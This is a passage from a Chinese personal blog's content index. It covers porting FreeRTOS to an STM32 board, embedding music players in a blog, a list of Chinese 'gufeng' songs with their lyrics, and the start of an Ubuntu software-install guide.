*/</code></pre><p>至此，系统时钟及外设的初始化程序已经完成。以上程序，除去 led.c/led.h, usart.c/usart.h 外，可作为无需操作系统的stm32项目模板。</p><h3 id="内核移植"><a href="#内核移植" class="headerlink" title="内核移植"></a>内核移植</h3><ul><li>新建组<ul><li>在项目中添加一个组，命名为 <strong>FreeRTOS</strong> ；</li><li>在本地目录新建文件夹，同样命名为 FreeRTOS ，用于存放系统内核的源文件；</li><li>在 FreeRTOS 文件夹下新建子文件夹 include ，用于存放系统内核的头文件。</li></ul></li><li>复制文件<ul><li>从系统 FreeRTOSv9.0.0 的源码 <code>FreeRTOS\Source</code> 中找到以下源文件，并将其复制至 FreeRTOS 文件夹；<ul><li><code>Source</code> 中的 <strong>list.c</strong>, <strong>queue.c</strong>, <strong>tasks.c</strong></li><li><code>Source\portable\RVDS\ARM_CM3</code> 中的 <strong>port.c</strong></li><li><code>Source\portable\MemMang</code> 中的 <strong>heap_2.c</strong></li></ul></li><li>从系统 FreeRTOSv9.0.0 的源码 <code>FreeRTOS</code> 中找到以下头文件，并将其复制至 FreeRTOS/include 文件夹；<ul><li><code>Source\include</code> 中的所有头文件，包括其中的 stdint.readme 文件</li><li><code>Source\portable\RVDS\ARM_CM3</code> 中的 <strong>portmacro.h</strong></li><li><code>Demo\CORTEX_STM32F103_Keil</code> 中的 <strong>FreeRTOSConfig.h</strong></li></ul></li><li>在项目组 FreeRTOS 中添加以上已复制好的源文件</li></ul></li></ul><blockquote><p><strong>说明</strong>：FreeRTOS可以在很多不同编译器中编译，其中的一些编译器比同类有更高级特性。因为这个原因，FreeRTOS不使用任何非C语言标准的特性或语法。一个例外情况是头文件stdint.h。在文件夹FreeRTOS/Source/include下包含一个叫做stdint.readme的文件，如果你的编译器不提供stdint类型定义，可以将stdint.readme文件重命名为stdint.h。</p></blockquote><p>参考：<a href="http://blog.csdn.net/zhzht19861011/article/details/50057531">FreeRTOS编码标准及风格指南</a></p><p>完成以上步骤后，文件结构应该如下各图所示：<br>File - FreeRTOS</p><p><img src="/assets/stm32/folderfreeRTOS.png" alt="本地文件中的FreeRTOS文件夹"></p><p>File - FreeRTOS\include</p><p><img src="/assets/stm32/folderfreeRTOSInclude.png" alt="本地文件中的include文件夹"></p><p>MDK - FreeRTOS</p><p><img src="/assets/stm32/groupfreeRTOS.png" alt="MDK中的FreeRTOS组"></p><ul><li>添加路径</li></ul><p>再次打开 <code>Options for target</code>&gt;&gt;<code>C/C++</code>，在 Include Paths 中添加:</p><ol><li>.\USER</li><li>.\FreeRTOS</li><li>.\FreeRTOS\include</li></ol><p><img src="/assets/stm32/addPath.png" alt="添加路径"></p><ul><li>修改启动文件</li></ul><p>打开文件 &quot;startup_stm32f10x_md.s&quot;，在 50 行附近找到以下代码段：</p><p>文件修改前</p><p><img src="/assets/stm32/beforeAddExport.png" alt="添加Export之前的启动文件"></p><p>修改方式如下：</p><p>在 &quot;__heap_limit&quot;后添加：</p><pre><code class="yml">IMPORT xPortPendSVHandlerIMPORT xPortSysTickHandlerIMPORT vPortSVCHandler</code></pre><p>将 75 行左右的</p><pre><code class="yml">DCD     SVC_HandlerDCD     PendSV_HandlerDCD     SysTick_Handler</code></pre><p>依次修改为：</p><pre><code class="yml">DCD     vPortSVCHandlerDCD     xPortPendSVHandlerDCD     xPortSysTickHandler</code></pre><p>文件修改后</p><p><img src="/assets/stm32/afterAddExport.png" alt="添加Export之前的启动文件"></p><h3 id="内核裁剪文件"><a href="#内核裁剪文件" class="headerlink" title="内核裁剪文件"></a>内核裁剪文件</h3><p>前面添加的头文件 &quot;FreeRTOSConfig.h&quot; 是系统内核配置文件，通过修改文件中的宏定义，可以对内核进行裁剪，保留所需功能。从例程中得到的该文件源码如下，更加详细的设置方法和各变量用途将在后续应用中介绍。</p><pre><code class="C">#ifndef FREERTOS_CONFIG_H#define FREERTOS_CONFIG_H/*----------------------------------------------------------- * Application specific definitions. * * These definitions should be adjusted for your particular hardware and * application requirements. * * THESE PARAMETERS ARE DESCRIBED WITHIN THE &#39;CONFIGURATION&#39; SECTION OF THE * FreeRTOS API DOCUMENTATION AVAILABLE ON THE FreeRTOS.org WEB SITE. * * See http://www.freertos.org/a00110.html. *----------------------------------------------------------*/#define configUSE_PREEMPTION    1#define configUSE_IDLE_HOOK      0#define configUSE_TICK_HOOK      0#define configCPU_CLOCK_HZ      ( ( unsigned long ) 72000000 )#define configTICK_RATE_HZ      ( ( TickType_t ) 1000 )#define configMAX_PRIORITIES    ( 5 )#define configMINIMAL_STACK_SIZE  ( ( unsigned short ) 128 )#define configTOTAL_HEAP_SIZE    ( ( size_t ) ( 17 * 1024 ) )#define configMAX_TASK_NAME_LEN    ( 16 )#define configUSE_TRACE_FACILITY  0#define configUSE_16_BIT_TICKS    0#define configIDLE_SHOULD_YIELD    1/* Co-routine definitions. */#define configUSE_CO_ROUTINES     0#define configMAX_CO_ROUTINE_PRIORITIES ( 2 )/* Set the following definitions to 1 to include the API function, or zeroto exclude the API function. */#define INCLUDE_vTaskPrioritySet    1#define INCLUDE_uxTaskPriorityGet    1#define INCLUDE_vTaskDelete        1#define INCLUDE_vTaskCleanUpResources  0#define INCLUDE_vTaskSuspend      1#define INCLUDE_vTaskDelayUntil      1#define INCLUDE_vTaskDelay        1/* This is the raw value as per the Cortex-M3 NVIC.  Values can be 255(lowest) to 0 (1?) (highest). */#define configKERNEL_INTERRUPT_PRIORITY     255/* !!!! configMAX_SYSCALL_INTERRUPT_PRIORITY must not be set to zero !!!!See http://www.FreeRTOS.org/RTOS-Cortex-M3-M4.html. */#define configMAX_SYSCALL_INTERRUPT_PRIORITY   191 /* equivalent to 0xb0, or priority 11. *//* This is the value being used as per the ST library which permits 16priority values, 0 to 15.  This must correspond to theconfigKERNEL_INTERRUPT_PRIORITY setting.  Here 15 corresponds to the lowestNVIC value of 255. */#define configLIBRARY_KERNEL_INTERRUPT_PRIORITY  15#endif /* FREERTOS_CONFIG_H */</code></pre><h3 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h3><p>经过以上步骤，系统移植工作已经完成，现在便可以创建多个任务，并启动任务调度器进行任务调度。</p><ul><li>在 &quot;main.h&quot; 添加 FreeRTOS 相关的头文件</li></ul><pre><code class="txt">#include &quot;FreeRTOS.h&quot;#include &quot;task.h&quot;#include &quot;queue.h&quot;#include &quot;list.h&quot;</code></pre><ul><li>编写任务</li></ul><pre><code class="C">// 定时亮灯任务static void vLEDOnTask(void *pvParameters)&#123;  TickType_t xLastWakeTime;  const TickType_t xFrequency = 1000/portTICK_RATE_MS;  /* xLastWakeTime需要被初始化为当前心跳计数值，此次赋值过后，  该变量将在vTaskDelayUntil函数中自动更新 */  xLastWakeTime = xTaskGetTickCount();  while(1)  &#123;    GPIO_ResetBits(GPIOB,LED_PORT);    UARTSendByByter(&#39;1&#39;);    vTaskDelayUntil(&amp;xLastWakeTime,xFrequency);  &#125;&#125;// 定时灭灯任务static void vLEDOffTask(void *pvParameters)&#123;  while(1)  &#123;        GPIO_SetBits(GPIOB,LED_PORT);    UARTSendByByter(&#39;2&#39;);      vTaskDelay(2000/portTICK_RATE_MS);  &#125;&#125;// 定时串口发送任务static void vUasrtSendTask(void *pvParameters)&#123;  volatile unsigned char cnt=0;  TaskHandle_t xTaskLedOffHandle = (TaskHandle_t)pvParameters;  while(1)  &#123;    UARTSendByByter(cnt++);    if(xTaskLedOffHandle!=NULL)    &#123;      if(cnt==50)        vTaskSuspend(xTaskLedOffHandle);    // 挂起灭灯任务      else if(cnt==100)        vTaskResume(xTaskLedOffHandle);    // 唤醒灭灯任务      else if(cnt==255)      &#123;        vTaskDelete(xTaskLedOffHandle);    // 删除灭灯任务        xTaskLedOffHandle=NULL;      &#125;    &#125;    vTaskDelay(1500/portTICK_RATE_MS);  &#125;&#125;</code></pre><ul><li>创建任务并启动调度器</li></ul><pre><code class="C">int main(void)&#123;  TaskHandle_t xTaskLedOffHandle;    /* 定义灭灯任务句柄 */  prvSetupHardware();            /* 设备初始化 */  xTaskCreate(vLEDOffTask,           /* 指向任务函数的指针 */      &quot;vLEDOffTask&quot;,           /* 任务的文本名字，只在调试中用到 */      configMINIMAL_STACK_SIZE,   /* 分配的栈空间大小 */      NULL,                 /* 没有给当前任务提供参数 */      tskIDLE_PRIORITY+1,        /* 设置任务优先级 */      &amp;xTaskLedOffHandle        /* 获取任务句柄，存入xTaskLedOffHandle */      );  xTaskCreate(vLEDOnTask, &quot;vLEDOnTask&quot;, configMINIMAL_STACK_SIZE, NULL, tskIDLE_PRIORITY+2, NULL);  xTaskCreate(vUasrtSendTask, &quot;vUasrtSendTask&quot;, configMINIMAL_STACK_SIZE,              (TaskHandle_t)(xTaskLedOffHandle), tskIDLE_PRIORITY+3, NULL);  /* 启动任务调度器 */  vTaskStartScheduler();  return 0;&#125;</code></pre><ul><li>功能测试</li></ul><p><img src="/assets/stm32/tasksTest.png" alt="任务测试结果"></p><p>从图中可以看出，16 进制数据 0x31, 0x32 交替出现，同时有一变量(假设为 y )从 0x01 逐一增至 0xff 后返回 0x01 继续增加，在 y 处于 0x32(50) 与 0x64(100) 之间时，0x32 暂停出现，后重新出现，直到 y 增至 0xff 后永不再现。此外，硬件部分，PB10 外接的 LED 也随着任务进行亮灭交替变换，最后保持在灯亮状态。</p><p><img src="/assets/stm32/ledOn.jpg" alt="LedOn"><br><img src="/assets/stm32/ledOff.jpg" alt="LedOff"></p>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> stm32 </tag>
            
            <tag> FreeRTOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在博客中添加音乐</title>
      <link href="2016/10/28/add-Music/"/>
      <url>2016/10/28/add-Music/</url>
      
        <content type="html"><![CDATA[<h2 id="音乐来源"><a href="#音乐来源" class="headerlink" title="音乐来源"></a>音乐来源</h2><p>现在要找个 <code>.mp3</code> 外链资源可真不容易，以往的酷狗歌曲信息里带着，现在也不见了，百度音乐下载也得用客户端，还不显示链接，各大音乐网站真是越来越小心了啊。</p><h3 id="网易云音乐"><a href="#网易云音乐" class="headerlink" title="网易云音乐"></a>网易云音乐</h3><p>想要从网站获取音乐链接的方法还是有的，比如说  <a href="http://music.163.com/#">网易云音乐</a>  。使用Google/firefox/edge等带开发者工具的浏览器打开网易云音乐，搜索自己想要的音乐，并进行播放，然后打开开发者工具。开发工具打开方式：</p><ol><li>谷歌：右键点击  <strong>检查</strong>，或使用快捷键 <code>Ctrl+Shift+I</code> ;</li><li>edge：右键点击 <strong>检查元素</strong>/ <strong>查看源</strong>，或使用快捷键 <code>F12</code> ;</li><li>firefox：快捷键 <code>Shift+F2</code> 。</li></ol><p><img src="/assets/music/xishanyao.png" alt="网易云音乐"></p><p>以  <a href="http://music.163.com/#/song?id=405253647">夕山谣</a>  为例，打开开发工具，找到  <code>Application</code> ，打开 <code>Frames/top/Media</code> 。</p><p><img src="/assets/music/xishanyaoLink.png" alt="开发工具"></p><p>右键选择&quot; Open link in new tab &quot; 或者 &quot; Copy link address &quot;，选取链接的前半部分,以 <code>.mp3</code> 结尾。得到链接：</p><pre><code class="yml">夕山谣http://m10.music.126.net/20161028204714/808f68e0d3afc7d68d6945d0ce8336eb/ymusic/5a20/163f/3437/9a6871479b12bc82fff53821676faedc.mp3</code></pre><h3 id="本地上传"><a href="#本地上传" class="headerlink" title="本地上传"></a>本地上传</h3><p>除了上述方法外，也可以手动制作音乐外链，当然，这需要借助于其它网站，比如  <a href="http://www.111ttt.com/up/">www.111ttt.com/up/</a>  。在该网站上传已经下好的音乐文件，然后点击播放地址，在弹出的页面底部就有已生成的外链地址了。</p><p><img src="/assets/music/upFile.png" alt="上传音乐"></p><pre><code class="yml">Critty 杏花弦外雨http://sc.111ttt.com/up/mp3/193721/278DF18856D56FEC6B4E6EDC15D97906.mp3</code></pre><h3 id="七牛云存储"><a href="#七牛云存储" class="headerlink" title="七牛云存储"></a>七牛云存储</h3><p><a href="http://www.qiniu.com/">七牛云</a> 作为国内领先的企业级云服务商，当然提供了最基本的云存储服务。当前可以免费注册并进行实名认证，之后可以获取 10GB 的免费存储空间。</p><p><img src="/assets/music/qiniuyunSpace.png" alt="七牛云免费空间"></p><p>注册并登录后，需要先创建一个空间，如 <code>litreily</code>，然后打开 <code>对象存储</code> &gt;&gt; <code>litreily</code> &gt;&gt; <code>内容管理</code>。此时便可上传文件，文件类型不限，我们可以将本地音乐文件上传后获取其外链地址。</p><p><img src="/assets/music/qiniuyunLink.png" alt="七牛云外链获取方法"></p><p>所得外链地址为：</p><pre><code class="yml">CRITTY - 轮回之境http://ofx35z92m.bkt.clouddn.com/CRITTY%20-%20%E8%BD%AE%E5%9B%9E%E4%B9%8B%E5%A2%83.mp3</code></pre><p><audio class="musicPlayer" src="http://ofx35z92m.bkt.clouddn.com/CRITTY%20-%20%E8%BD%AE%E5%9B%9E%E4%B9%8B%E5%A2%83.mp3" autoplay></audio></p><h2 id="音乐播放器"><a href="#音乐播放器" class="headerlink" title="音乐播放器"></a>音乐播放器</h2><h3 id="网易云音乐插件"><a href="#网易云音乐插件" class="headerlink" title="网易云音乐插件"></a>网易云音乐插件</h3><p>网易云音乐提供了外链播放器，官方提供的使用方法如下：</p><ol><li>在 <a href="http://music.163.com/">music.163.com</a> 进入单曲、歌单、专辑、电台节目页面后，点击 “生成外链播放器” 链接。</li><li>歌单和专辑外链播放器可以选择大中小三种尺寸，单曲和电台节目可以选择中小两种尺寸。你可以选择最适合你网站设计的尺寸。</li><li>还可以选择是否要自动播放，打上勾后，别人访问网站时播放器会自动开始播放。</li><li>最后将播放器的代码黏贴到你的网站上，大功告成！</li></ol><p>[示例：杏花轩外雨]</p><p><img src="/assets/music/wlPlayer.png" alt="网易云音乐外链播放器"></p><p>[示例代码]</p><p><img src="/assets/music/wlDemo.png" alt="网易云音乐外链demo"></p><p>[示例说明]</p><ol><li>HTML源码中的 &quot; auto=1 &quot; 代表自动播放，改为0即可取消自动播放功能；</li><li>在markdown文件中引用该插件时，需要将 <code>iframe</code> 的 <code>width</code> 和 <code>height</code> 属性值用双引号包围起来，即 width=&quot;330&quot; height=&quot;86&quot; ,否则可能出现无法解析该代码的情况；</li><li>使用插件时可以添加一个类（如：class=&quot;musicPlayer&quot;），参考以下代码可以设置播放器的长宽。</li></ol><pre><code class="css">.musicPlayer&#123;    width: 100%;    max-width: 500px;&#125;</code></pre><p>[示例播放1：height=66 auto=1]</p><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=32957012&auto=1&height=66"></iframe><pre><code class="html">&lt;iframe class=&quot;musicPlayer&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot;height=&quot;86&quot; src=&quot;https://music.163.com/outchain/player?type=2&amp;id=32957012&amp;auto=0&amp;height=66&quot;&gt;&lt;/iframe&gt;</code></pre><p>[示例播放2：height=32 auto=0]</p><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="https://music.163.com/outchain/player?type=2&id=32548265&auto=0&height=32"></iframe><pre><code class="html">&lt;iframe class=&quot;musicPlayer&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;298&quot;height=&quot;52&quot; src=&quot;https://music.163.com/outchain/player?type=2&amp;id=32548265&amp;auto=0&amp;height=32&quot;&gt;&lt;/iframe&gt;</code></pre><h3 id="audio-js"><a href="#audio-js" class="headerlink" title="audio.js"></a>audio.js</h3><p><a href="https://kolber.github.io/audiojs/">audio.js</a>是一款轻量级的音乐播放器，下载文件后，将文件夹 &quot;audiojs&quot; 放在网站文件目录中，通过以下代码的形式将该播放器引入网页中。</p><pre><code class="html">&lt;head&gt;    ...    &lt;script src=&quot;/audiojs/audio.min.js&quot;&gt;&lt;/script&gt;    &lt;script&gt;      audiojs.events.ready(function() &#123;        audiojs.createAll();      &#125;);    &lt;/script&gt;    ...&lt;/head&gt;&lt;body&gt;    ...    &lt;!-- 音乐播放器位置 --&gt;    &lt;!-- preload=&quot;auto&quot; 可以替换为 autoplay 或者 loop  --&gt;    &lt;audio class=&quot;musicPlayer&quot; src=&quot;https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3&quot;    preload=&quot;auto&quot;&gt;&lt;/audio&gt;    &lt;!-- 说明：使用该插件后，其脚本语言将自动为其添加以下内容：        class=&quot;audiojs&quot; classname=&quot;audiojs&quot; id=&quot;audiojs_wrapper0&quot;        如果一个页面中存在多个audiojs播放器，其id尾数将从0逐一增加        通过css修改这些属性，我们可以改变播放器的外观 --&gt;    ...&lt;/body&gt;</code></pre><p>[示例：杏花轩外雨，链接由上述1.2方式而得]<br><audio class="musicPlayer" src="https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3" preload="auto"></audio></p><p>[示例html源码]</p><pre><code class="html">&lt;div class=&quot;audiojs   playing&quot; classname=&quot;audiojs&quot; id=&quot;audiojs_wrapper0&quot;&gt;    &lt;audio class=&quot;musicPlayer&quot; src=&quot;https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3&quot; preload=&quot;auto&quot;&gt;&lt;/audio&gt;    &lt;div class=&quot;play-pause&quot;&gt;        &lt;p class=&quot;play&quot;&gt;&lt;/p&gt;        &lt;p class=&quot;pause&quot;&gt;&lt;/p&gt;        &lt;p class=&quot;loading&quot;&gt;&lt;/p&gt;        &lt;p class=&quot;error&quot;&gt;&lt;/p&gt;    &lt;/div&gt;    &lt;div class=&quot;scrubber&quot;&gt;        &lt;div class=&quot;progress&quot; style=&quot;width: 167.146px;&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;loaded&quot; style=&quot;width: 280px;&quot;&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;div class=&quot;time&quot;&gt;        &lt;em class=&quot;played&quot;&gt;02:22&lt;/em&gt;/&lt;strong class=&quot;duration&quot;&gt;03:57&lt;/strong&gt;    &lt;/div&gt;      &lt;div class=&quot;error-message&quot;&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li><a href="http://www.ithome.com/html/it/195970.htm">7 款高颜值 HTML5 播放器</a></li><li><a href="http://www.oschina.net/news/27466/html5-audio-players">10 个基于 Web 的 HTML5 音乐播放器</a></li><li><a href="http://www.shejidaren.com/free-audio-players.html">10 个免费开源的 JS 音乐播放器插件</a></li><li><a href="http://www.17sucai.com/pins/tag/3189.html">播放器 jquery 特效代码</a></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>网易云音乐的播放器插件使用方便，但是连接效率太低，经常获取不到资源或者获取速度过慢，而  audiojs  播放器虽然外观简陋些，但资源下载效率还不错，而且资源地址可以自定义，不会受限。所以，各有利弊，依情况而定吧。</p>]]></content>
      
      
      <categories>
          
          <category> Media </category>
          
      </categories>
      
      
        <tags>
            
            <tag> music </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优美的古风歌曲</title>
      <link href="2016/10/27/antiquity-music/"/>
      <url>2016/10/27/antiquity-music/</url>
      
        <content type="html"><![CDATA[<h2 id="古风"><a href="#古风" class="headerlink" title="古风"></a>古风</h2><blockquote><p><a href="http://baike.baidu.com/subview/297/9729252.htm">古风</a> 是一类新型的文化，是现代人对古代曲风的称呼。&quot;古风&quot; 以中国的传统文化为基调，结合中国传统的文学、琴棋书画、诗词歌赋等，经过不断的发展磨合，形成了比较完备的音乐、文学、绘画等艺术形式。</p></blockquote><h3 id="古风音乐社团"><a href="#古风音乐社团" class="headerlink" title="古风音乐社团"></a>古风音乐社团</h3><p><a href="http://www.mymmqm.com/">墨明棋妙</a> <a href="http://5sing.kugou.com/lfmmusic/default.html">鸾凤鸣</a> <a href="http://5sing.kugou.com/pingshaluoyan/default.html">平纱落雁</a> <a href="http://music.163.com/#/user/home?id=64846286">满汉全席</a> <a href="http://www.oyinyue.com/11388725">声自在</a> <a href="http://5sing.kugou.com/qianchengzuige/default.html">千城醉歌</a> <a href="http://5sing.kugou.com/liushangqushui/default.html">流觞曲水</a> <a href="http://5sing.kugou.com/5590972/default.html">花魁楼</a> <a href="http://5sing.kugou.com/qiange/default.html">千歌未央</a> <a href="http://5sing.kugou.com/27373394/default.html">云歌落</a></p><h3 id="古风音乐人"><a href="#古风音乐人" class="headerlink" title="古风音乐人"></a>古风音乐人</h3><p><a href="http://www.xiami.com/artist/68934">河图</a> <a href="http://www.xiami.com/artist/52636">董贞</a> <a href="http://www.xiami.com/artist/98637">小曲儿</a> <a href="http://www.xiami.com/artist/103550">少司命</a> <a href="http://y.baidu.com/qingnong914">清弄</a> <a href="http://bd.kuwo.cn/mingxing/%E6%BD%87%E6%A2%A6%E4%B8%B4.htm?from=baidu">潇梦临</a> <a href="http://www.xiami.com/artist/87301">檀烧</a> <a href="http://www.xiami.com/artist/65156">心然</a> <a href="http://www.xiami.com/artist/55553">萧人凤</a> <a href="http://bd.kuwo.cn/mingxing/%E5%87%8C%E4%B9%8B%E8%BD%A9.htm?from=baidu">凌之轩</a> <a href="http://i.xiami.com/huanger117">晃儿</a> <a href="http://www.xiami.com/artist/102392">重小烟</a> <a href="http://www.xiami.com/artist/80464">音频怪物</a></p><h3 id="古风网站"><a href="#古风网站" class="headerlink" title="古风网站"></a>古风网站</h3><p><a href="http://5sing.kugou.com/">5sing</a> <a href="http://xingmaow.com/">古风杏猫网</a> <a href="http://www.gufengquan.com/">古风圈论坛</a></p><h2 id="古风歌曲品鉴"><a href="#古风歌曲品鉴" class="headerlink" title="古风歌曲品鉴"></a>古风歌曲品鉴</h2><h3 id="杏花弦外雨"><a href="#杏花弦外雨" class="headerlink" title="杏花弦外雨"></a>杏花弦外雨</h3><blockquote><p><a href="http://baike.baidu.com/subview/10846918/19226803.htm">杏花弦外雨</a>  是由  潇梦临  作曲及编曲，若紫鸢作词，由  <a href="http://baike.baidu.com/view/3113695.htm">西国的海妖</a>、<a href="http://baike.baidu.com/view/8616563.htm">CRITTY</a>  演唱的一首优质古风歌曲。收录在CRITTY的《弦上春雪》原创古风非实体专辑中。MV由尉迟嘉馨制作，展现了江南水乡的美丽风景，讲述了西厢记中一段才子佳人相思空守的故事。</p></blockquote><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=32957012&auto=0&height=66"></iframe><pre><code class="txt">作曲/编曲：潇梦临作词：若紫鸢演唱：西国的海妖、CRITTY流莺悄飞近船侧  伴桨声低语浅说柳梢沾绿了烟波  绕堤三分春色旧书翻入寻常调  隔岸依稀吴越歌反复着几回啼笑  往来几段离合有书生翩翩风流  有佳人独坐楼阁有一日擦肩而过  惹来两情脉脉诗文里风月渐浓  只不见天长地久心事落在琴弦外  又与谁轻轻说说那年烟雨空濛  杏花船摇摆而过过谁家楼台  一声弦歌拂落他素白衣着  山水间几程远游堪折何折年年柳色当柳梢下的集句  尽数流过眼底拈一缕春风浅浅作序待到行间字里再不是眼前朝夕曲中人早已离题当一阵阵临窗雨  洗旧那时心绪曲中人远隔千里万里  不知不觉的停笔留下余韵待续  就在那片烟波外淡成了迤逦后来事不知如何  那佳人还在楼阁独对着雨帘萧瑟  一字一句斟酌诗文里风月残留  不经意换了角色陈词落在琴弦外  还有谁轻轻说说那年烟雨空濛  杏花船摇摆而过过谁家楼台  一声弦歌落寞她等过几番  绵绵飞絮亦白头空折还折年年柳色当柳梢下的集句  尽数流过眼底拈一缕春风浅浅作序  待到行间字里再不是眼前朝夕  曲中人早已离题当一阵阵临窗雨  洗旧那时心绪曲中人远隔千里万里  不知不觉的停笔留下余韵待续  就在那片烟波外淡成了迤逦</code></pre><p><img src="/assets/music/xinghuaxianwaiyu.png" alt="杏花弦外雨"></p><h3 id="遇萤"><a href="#遇萤" class="headerlink" title="遇萤"></a>遇萤</h3><blockquote><p>由  YT君  制作的橙光文字游戏《逆袭之星途闪耀》的剧中剧《遇龙》的主题曲《遇萤》。  <a href="http://baike.baidu.com/item/%E9%81%87%E8%90%A4">遇萤</a>  是<a href="http://baike.baidu.com/view/8616563.htm">CRITTY</a> 演唱歌曲，由执素兮作曲，顾聆落作词。</p></blockquote><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=32548265&auto=0&height=66"></iframe><pre><code class="txt">演唱：CRITTY    歌曲监制：我是YT    作曲/策划/和声编写：执素兮    作词：顾聆落    编曲：潇梦临    尉迟龙炎(龙王)：既然你叫流萤...    那不如…    不如我就赠你漫天流萤吧…    若千年的光阴 轮回里　　是否只为寻觅着你　　恍若所有月明　　圆缺或是阴晴 都只为了你　　尘缘似一场花雨　　眉目缱绻中枯寂　　指间的瞬息　　拾得你一颗泪滴　　若忘川的涟漪 随我心　　是否只为不忘记你　　恍若所有思绪　　怜惜或是悲戚 都只为了你　　尘缘似一场烟影　　眉目缱绻中飘零　　心之所寄　　劫数应声而起　　前生今世来生　　与你相遇 在每一个梦里　　拂袖唤漫天流萤　　掌心微光谁眼中倒映　　回眸不舍离去　　此情为你 在心上停栖　　下一世 再与你永不分离    尉迟龙炎(龙王)：只是从今往后，    你都要学会自己一个人...    勇敢走下去，即便没有我，也不要害怕…    若忘川的涟漪 随我心　　是否只为不忘记你　　恍若所有思绪　　怜惜或是悲戚 都只为了你　　尘缘似一场流萤　　眉目缱绻中宁静　　照谁前行　　灿若彻夜繁星　　前生今世来生　　与你相遇 在每一个梦里　　拂袖唤漫天流萤　　掌心微光谁眼中倒映　　回眸不舍离去　　此情为你 在心上停栖　　下一世 再与你永不分离　　前生今世来生　　与你相遇 在每一个梦里　　拂袖唤漫天流萤　　掌心微光谁眼中倒映　　回眸不舍离去　　此情为你 在心上停栖　　这一世 愿与你共存天地　　这一世 愿与你共存天地</code></pre><p><img src="/assets/music/yuying.png" alt="遇萤"></p><h3 id="倾尽天下"><a href="#倾尽天下" class="headerlink" title="倾尽天下"></a>倾尽天下</h3><blockquote><p>倾尽天下 是音乐团队 <a href="http://baike.baidu.com/view/1204149.htm">墨明棋妙</a> 创作的古风歌曲，由 <a href="http://baike.baidu.com/subview/649792/11273294.htm">finale</a> 作词，<a href="http://baike.baidu.com/subview/4151/9915126.htm">河图</a> 作曲、编曲并演唱。</p></blockquote><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=27571867&auto=0&height=66"></iframe><pre><code class="txt">作词：Finale作曲/编曲/演唱：河图刀戟声共丝竹沙哑谁带你看城外厮杀七重纱衣 血溅了白纱兵临城下六军不发谁知再见已是 生死无话当时缠过红线千匝一念之差作为人嫁那道伤疤 谁的旧伤疤还能不动声色饮茶踏碎这一场 盛世烟花血染江山的画怎敌你眉间 一点朱砂覆了天下也罢始终不过 一场繁华碧血染就桃花只想再见 你泪如雨下听刀剑喑哑高楼奄奄一息 倾塌是说一生命犯桃花谁为你算的那一卦最是无瑕风流不假画楼西畔 反弹琵琶暖风处处 谁心猿意马色授魂与颠倒容华兀自不肯相对照蜡说爱折花 不爱青梅竹马到头来算的那一卦终是为你 覆了天下明月照亮天涯最后谁又得到了蒹葭江山嘶鸣战马怀抱中那寂静的喧哗风过天地肃杀容华谢后 君临天下登上九重宝塔皇妃 朱砂皇妃 朱砂看一夜流星飒沓回到那一刹那岁月无声也让人害怕枯藤长出枝桠原来时光已翩然轻擦梦中楼上月下站着眉目依旧的你啊拂去衣上雪花并肩看 天地浩大回到那一刹那岁月无声也让人害怕枯藤长出枝桠原来时光已翩然轻擦梦中楼上月下站着眉目依旧的你啊拂去衣上雪花并肩看 天地浩大梦中楼上月下站着眉目依旧的你啊拂去衣上雪花并肩看 天地浩大</code></pre><p><img src="/assets/music/qingjintianxia.png" alt="倾尽天下"></p><h2 id="播放列表"><a href="#播放列表" class="headerlink" title="播放列表"></a>播放列表</h2><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="https://music.163.com/outchain/player?type=0&id=2310717269&auto=0&height=430"></iframe>]]></content>
      
      
      <categories>
          
          <category> Media </category>
          
      </categories>
      
      
        <tags>
            
            <tag> music </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu下安装常用软件</title>
      <link href="2016/10/12/installSW/"/>
      <url>2016/10/12/installSW/</url>
      
        <content type="html"><![CDATA[<h2 id="apt-get-install"><a href="#apt-get-install" class="headerlink" title="apt-get install"></a>apt-get install</h2><h3 id="Atom"><a href="#Atom" class="headerlink" title="Atom"></a>Atom</h3><pre><code class="bash">sudo add-apt-repository ppa:webupd8team/atomsudo apt-get update  sudo apt-get install atom</code></pre><p><code>add-apt-repository</code>用于添加软件源，<code>apt-get update</code>用于更新软件源，更新后即可使用<code>apt-get install</code>安装所需的软件。</p><h3 id="Sublime-Text-3"><a href="#Sublime-Text-3" class="headerlink" title="Sublime Text 3"></a>Sublime Text 3</h3><pre><code class="bash">sudo add-apt-repository ppa:webupd8team/sublime-text-3  sudo apt-get update  sudo apt-get install sublime-text-install</code></pre><h2 id="添加快捷方式"><a href="#添加快捷方式" class="headerlink" title="添加快捷方式"></a>添加快捷方式</h2><p>在Ubuntu下，有些deb安装包，安装完成后只能通过终端启动，而且不能关闭终端，为此，我们可以给应用程序添加快捷方式。</p><pre><code class="bash">sudo vim 